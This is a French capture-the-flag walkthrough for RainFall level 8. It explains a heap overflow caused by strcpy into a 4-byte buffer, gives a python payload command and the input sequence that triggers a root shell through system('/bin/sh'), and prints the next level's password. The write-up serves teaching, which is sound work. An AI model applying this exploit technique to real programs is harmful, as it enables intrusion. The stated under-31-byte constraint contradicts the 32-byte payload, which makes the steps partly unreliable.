# RainFall Level 8 Walkthrough

## Objectif

Obtenir un shell en exploitant une vulnérabilité dans un programme C.

## Analyse du binaire

Le programme lit des entrées dans une boucle infinie avec `fgets()`, puis compare le début de l'entrée à plusieurs commandes comme :

* `auth`
* `service`
* `reset`
* `login`

Il utilise les pointeurs globaux `auth` et `service` pour stocker des données.

### Vulnérabilité

Quand la commande `auth` est envoyée, le programme fait :

```c
auth = malloc(4);
strcpy(auth, local_8b);
```

Mais `strcpy()` copie sans vérifier la taille, ce qui permet un **buffer overflow** de `auth`, allouée seulement sur 4 octets !

Ensuite, si la commande `login` est appelée, le programme fait :

```c
if (*(int *)(auth + 0x20) != 0) {
    system("/bin/sh");
}
```

Donc le but est de faire en sorte que `auth + 0x20` contienne une valeur non nulle.

## Contraintes

* Le contenu de `local_8b` (copié dans `auth`) doit être **< 31 octets**, sinon `strcpy` est ignoré.
* `local_8b` débute à l'offset 5 de `local_90`, donc le payload doit être pensé avec un décalage.

## Exploit

### En ligne de commande :

```bash
python -c "print 'auth ' + 'A'*32" > payload
./level8 < payload
```

Puis :

```
service
service
login
```

Cela affiche :

```bash
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## Conclusion

Ce niveau illustre un buffer overflow sur heap avec écriture au-delà des limites allouées et condition basée sur un offset.

Payload bien calculé = shell gagné 🚀
